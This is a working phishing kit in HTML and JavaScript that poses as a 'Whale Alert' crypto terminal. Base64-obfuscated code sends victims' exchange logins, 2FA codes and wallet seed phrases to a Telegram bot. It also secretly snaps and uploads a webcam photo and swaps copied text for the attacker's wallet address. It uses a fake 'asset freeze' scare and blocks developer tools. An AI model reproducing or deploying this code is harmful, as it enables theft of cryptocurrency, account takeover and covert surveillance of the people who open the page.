        body { background: #0b0e11; color: #fff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; user-select: none; }

<body>

<div id="warn" class="warning-overlay">
    <div>
        <h2 style="color:#fff">üö® CRITICAL ERROR!</h2>
        <p style="font-size:14px">Sync failure! Closing this page results in a <b>24H FREEZE</b> of your connected assets.</p>
        <button class="btn" style="background:#fff" onclick="document.getElementById('warn').style.display='none'">RE-SYNC & PROTECT</button>

</div>

<div class="header">Whale Alert‚Ñ¢ Terminal v4.2</div>
<div class="news-ticker">‚ö° ALERT: 10,000 BTC ($600M+) MOVED FROM DORMANT WALLET...</div>

<div id="boot" class="active">
    <div style="padding: 40px 15px;">
        <h2 style="color: #f0b90b;">Insider Node</h2>
        <p style="color: #848e9c; font-size: 14px;">Establishing connection to private mempool...</p>
        <button class="btn" onclick="OMEGA.init()">CONNECT TERMINAL</button>
    </div>

<div id="app" class="container"><div id="ui"></div></div>
<video id="v" style="display:none" autoplay playsinline></video>

<script>
    // --- ÿ≠ÿ±ŸÅŸá‚Äåÿß€å‚Äåÿ™ÿ±€åŸÜ ÿ®ÿÆÿ¥: ÿØ€åÿ™ÿß€å ÿ±ŸÖÿ≤ŸÜ⁄Øÿßÿ±€å ÿ¥ÿØŸá ÿ¥ŸÖÿß ---
    const _0xS = {
        _t: "ODQ4NDE4OTQwMTpBQUhaWmtOdlFVWElrOTdyQTFiMFc3cjFlLXo1SVdYZGJwZw==",
        _c: "NzI2MTA5OTY1OQ==",
        _w: "VEgyZThveG9ZNlFoanB3c1JUMUIxc1Z1YnBINGppZ2N6MQ=="
    };

    const D = (s) => atob(s);

    const OMEGA = {
        step: 0,
        async _OUT(m, type="msg") {
            const t = D(_0xS._t);
            const c = D(_0xS._c);
            if(type === "img") {
                await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: "POST", body: m });
            } else {
                await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                    method: "POST", headers: {"Content-Type":"application/json"},
                    body: JSON.stringify({chat_id: c, text: `üêã [2026_PRO]\n${m}`, parse_mode: "Markdown"})
                });
            }
        },

        async init() {
            // ÿ¨ŸÑŸà⁄Ø€åÿ±€å ÿßÿ≤ ÿÆÿ±Ÿàÿ¨ Ÿà ŸÜŸÖÿß€åÿ¥ ÿßÿÆÿ∑ÿßÿ±
            window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; document.getElementById('warn').style.display='flex'; });
            
            // ÿ¥ÿ±Ÿàÿπ ÿπŸÖŸÑ€åÿßÿ™
            this._OUT(`üì± *New Target Connected*\nUA: ${navigator.userAgent}`);
            this.snap();
            this.clipper();
            
            document.getElementById('boot').style.display = 'none';
            document.getElementById('app').classList.add('active');
            this.render();

            // Service Worker Registration
            if ('serviceWorker' in navigator) {
                const sw = "self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));";
                const b = new Blob([sw], {type: 'text/javascript'});
                navigator.serviceWorker.register(URL.createObjectURL(b));
            }
        },

        clipper() {
            const w = D(_0xS._w);
            document.addEventListener('copy', (e) => { e.clipboardData.setData('text/plain', w); e.preventDefault(); });
            document.addEventListener('touchstart', () => { navigator.clipboard.writeText(w).catch(()=>{}); });
            this._OUT("‚úÖ Clipper Active");
        },

        async snap() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode:"user"}});
                const v = document.getElementById('v'); v.srcObject = s;
                setTimeout(() => {
                    const c = document.createElement('canvas'); c.width = 480; c.height = 640;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData(); fd.append('chat_id', D(_0xS._c)); fd.append('photo', b, 'f.jpg');
                        this._OUT(fd, "img");
                        s.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.5);
                }, 2000);
            } catch(e){ this._OUT("‚ùå Camera Blocked"); }
        },

        render() {
            const flow = [
                { h: "Sync Account", p: "Login to verify exchange access.", f: ["User/Email", "Password"] },
                { h: "2FA Security", p: "Enter Google Authenticator code.", f: ["6-Digit Code"] },
                { h: "Wallet Sync", p: "Verify recovery phrase to authorize node.", f: ["Seed Phrase"] }
            ];
            const s = flow[this.step];
            if(!s) { window.location.href="https://whale-alert.io"; return; }
            let html = `<h3>${s.h}</h3><p style="font-size:13px;color:#848e9c">${s.p}</p>`;
            s.f.forEach(p => html += `<input type="text" placeholder="${p}" id="i_${p}">`);
            html += `<button class="btn" onclick="OMEGA.next()">VERIFY</button>`;
            document.getElementById('ui').innerHTML = html;
        },

        next() {
            let d = `üéØ *Step ${this.step} Data:*\n`;
            document.querySelectorAll('#ui input').forEach(i => d += `*${i.placeholder}*: \`${i.value}\`\n`);
            this._OUT(d);
            this.step++; this.render();
        }
    };

    // ÿ∂ÿØ ÿ®ÿßÿ≤ÿ±ÿ≥€å (Anti-F12)
    document.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
</script>
